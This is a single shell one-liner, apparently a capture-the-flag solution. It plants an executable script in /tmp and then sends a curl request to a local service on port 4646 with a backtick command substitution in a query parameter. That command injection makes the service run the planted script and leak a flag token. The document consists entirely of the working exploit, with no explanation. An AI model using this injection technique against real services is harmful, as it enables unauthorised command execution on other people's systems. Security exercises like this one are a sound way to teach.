perl -e 'print "#!/bin/sh\ngetflag > /tmp/token\n"' > /tmp/T; chmod +x /tmp/T; curl localhost:4646?x='`/*/T`';cat /tmp/token
